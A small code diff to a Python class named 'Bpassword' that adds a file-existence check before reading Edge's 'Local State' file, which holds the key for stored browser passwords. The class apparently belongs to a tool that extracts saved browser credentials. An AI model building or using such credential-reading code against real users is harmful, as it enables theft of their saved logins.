@@ -38,6 +38,7 @@ class Bpassword(object):
         # local_state_path = os.path.join(os.environ["USERPROFILE"],
         #                                 "AppData", "Local", "Microsoft", "Edge",
         #                                 "User Data", "Local State")
+        if not os.path.exists(local_state_path): return None
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = f.read()
             local_state = json.loads(local_state)
